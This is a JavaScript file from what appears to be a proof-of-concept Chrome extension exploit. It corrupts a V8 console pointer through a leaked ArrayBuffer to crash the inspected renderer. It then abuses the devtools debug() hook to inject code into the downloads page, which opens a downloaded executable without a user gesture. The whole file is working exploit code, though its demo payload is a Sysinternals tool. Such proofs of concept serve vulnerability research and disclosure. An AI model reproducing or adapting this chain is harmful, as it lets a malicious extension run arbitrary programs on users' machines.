const downloadUrl = "https://live.sysinternals.com/procexp.exe";

chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
    if (message === "query-objects-results-saved") {
        onQueryObjectsResultsSaved();
    }
});

chrome.runtime.sendMessage(undefined, "devtools-page-loaded");

function onQueryObjectsResultsSaved() {
    chrome.devtools.inspectedWindow.eval(`(${evaluatedFunction.toString()})("${downloadUrl}")`);
}

// Designed to run within the context of the inspected page.
function evaluatedFunction(downloadUrl) {
    if (location.href === "https://example.com/") {
        if (window.devtoolsCrashEx.queryObjectsResult.length === 1) {
            // The window.devtoolsCrashEx object is setup directly by the background script.
            // window.devtoolsCrashEx.queryObjectsResult[0] refers to the command line API
            // ArrayBuffer.
            //
            // This buffer contains a V8Console* + int pair:
            //
            // https://source.chromium.org/chromium/chromium/src/+/master:v8/src/inspector/v8-console.h;l=104;drc=3b60af8669916f3b019745f19144392f6b4f6b12
            //
            // Therefore, filling the ArrayBuffer with 0s will mean that the V8Console pointer is
            // effectively set to null.
            let bigIntArray = new BigInt64Array(window.devtoolsCrashEx.queryObjectsResult[0]);
            bigIntArray.fill(0n);

            // This will crash the renderer, due to the associated CommandLineAPIData fields being
            // overwritten above. When the inspected page is loaded again, this entire function will
            // be re-run.
            window.devtoolsCrashEx.stashedQueryObjects(Object);
        }
    } else {
        // Note the false statement on the last line below. The second argument to debug() is a
        // condition statement. If the statement evaluates to true, the debugger will break when the
        // specified function is called. That's undesirable here, which is why the code ends with
        // false.
        debug(addEventListener, `if (!window.devtoolsCrashExFunctionRun) {
            window.devtoolsCrashExFunctionRun = true;

            documentLoaded(function () {
                findAndRunDownload("${downloadUrl}");
            });

            function findAndRunDownload(downloadUrl) {
                let downloadsManager = document.getElementsByTagName("downloads-manager")[0];
            
                if (downloadsManager.items_.length === 0) {
                    return;
                }
            
                // It's assumed here that the file that was downloaded is still the most recent item.
                let firstItem = downloadsManager.items_[0];
            
                if (firstItem.url === downloadUrl && !firstItem.fileExternallyRemoved) {
                    downloadsManager.mojoHandler_.openFileRequiringGesture(firstItem.id);
                }
            }

            function documentLoaded(callback) {
                if (document.readyState === "complete") {
                    callback();
                } else {
                    window.addEventListener("load", callback);
                }
            }
        }
        false;`);
    }
}